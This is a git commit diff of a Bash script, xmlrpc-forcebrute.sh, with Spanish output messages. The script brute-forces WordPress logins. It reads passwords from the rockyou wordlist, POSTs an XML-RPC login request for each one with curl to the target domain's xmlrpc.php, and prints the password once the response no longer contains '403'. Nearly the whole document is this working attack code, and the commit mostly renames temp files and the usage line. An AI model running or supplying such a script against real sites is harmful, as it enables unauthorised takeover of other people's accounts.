4edd27ea17a550cb3dee7f7f66f81832d5dce8d5
Jose Luis <loft17@gmail.com>
2023-09-16 18:31:59 +0200

    Update xmlrpc-forcebrute.sh

--- xmlrpc-forcebrute.sh
+++ xmlrpc-forcebrute.sh
@@ -3,17 +3,20 @@ wordlist="/usr/share/wordlists/rockyou.txt"
 
 if [ ! -f "$wordlist" ]; then
     echo "$wordlist No existe."
+
 fi
 
 if [ -z "$1" ]; then
     echo "Usuario no seleccionado."
-    echo "./xmlrpc-forcebrute.sh USER DOMAIN"
+    echo "./aaa.sh USER DOMAIN"
 elif [ -z "$2" ]; then
     echo "Dominio no seleccionado."
-    echo "./xmlrpc-forcebrute.sh USER DOMAIN"
+    echo "./aaa.sh USER DOMAIN"
 else
+
+
     cat $wordlist | while read LINE; do
-        rm /tmp/log.log /tmp/enviar.xml
+        rm /tmp/curl.tmp /tmp/enviar.xml
         cat <<< "
                     <?xml version="1.0" encoding="UTF-8"?>
                         <methodCall> 
@@ -26,13 +29,15 @@ else
         " > /tmp/enviar.xml
 
         echo -e "[+] Probamos con la contraseña $LINE"
-        curl -s -X POST http://$2/xmlrpc.php -d@/tmp/enviar.xml -o /tmp/log.log 
 
-        if [ ! "$(cat /tmp/log.log | grep '403')" ]; then
+
+        curl -s -X POST http://$2/xmlrpc.php -d@/tmp/enviar.xml -o /tmp/curl.tmp
+
+
+        if [ ! "$(cat /tmp/curl.tmp | grep '403')" ]; then
             echo -e "[+] La contraseña para $1 es $LINE"
             exit 0
         fi
 
-        rm /tmp/log.log /tmp/enviar.xml
     done
 fi
